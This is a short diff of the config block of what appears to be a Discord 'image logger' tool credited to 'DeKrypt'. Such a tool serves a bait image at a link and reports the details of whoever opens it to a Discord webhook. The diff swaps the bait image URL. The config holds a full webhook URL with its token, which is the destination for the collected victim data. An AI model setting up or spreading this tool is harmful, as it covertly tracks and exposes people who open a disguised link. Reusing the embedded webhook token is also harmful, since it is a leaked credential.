@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1140355873466761306/E3EpFQeRd7dsWOdJc2o42DNt0W1FFsg_wd_0hAG-W0NgaqO3KK_yZhqFH2x4ysVeqjBv",
-    "image": "https://media.tenor.com/0NUTFoRVTggAAAAC/middle-click.gif", # You can also have a custom image by using a URL argument
+    "image": "https://media.discordapp.net/attachments/1137840653477363842/1138265348274131084/image.png?width=1248&height=701", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
